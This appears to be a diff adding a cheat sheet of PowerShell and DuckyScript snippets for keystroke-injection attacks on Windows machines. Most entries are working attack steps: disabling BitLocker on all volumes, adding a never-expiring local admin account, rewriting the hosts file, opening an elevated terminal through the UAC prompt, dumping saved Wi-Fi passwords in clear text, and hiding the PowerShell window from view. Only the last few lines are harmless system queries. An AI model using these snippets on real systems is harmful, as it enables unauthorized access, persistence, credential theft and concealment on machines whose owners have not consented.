@@ -1,0 +1,53 @@
+Disable bitlocker on all volumes
+$BLV = Get-BitLockerVolume
+Disable-BitLocker -MountPoint $BLV
+
+add local admin user
+cmd.exe /c net user MyLocalAdmin P@ssw0rd* /add /expires:never
+
+add item to hosts file
+$file = "C:\Windows\System32\drivers\etc\hosts"
+$hostfile = Get-Content $file
+$hostfile += "8.8.8.8   Google.com"
+Set-Content -Path $file -Value $hostfile -Force
+
+get admin PS (DuckyScript)
+DELAY 1500
+GUI x
+DELAY 600
+STRING a
+DELAY 1100
+ALT y
+DELAY 1800
+STRING Write Host "you've been hacked! This is an admin terminal and I can do ANYTHING!"
+ENTER
+
+Dump wifi passwords
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+
+hide powershell Window (ducky script)
+REM Once powershell is up and running
+ALT SPACE
+STRING m
+LEFTARROW
+REPEAT 50
+STRING [console]::WindowHeight=1
+ENTER
+STRING [console]::WindowWidth=1
+ENTER
+
+get Dns Cache
+Get-DnsClientCache
+
+get services running
+Get-Service
+
+get start apps
+Get-StartApps
+
+Time and timezone
+date
+Get-TimeZone
+
+install package
+Install-Package -name <name>
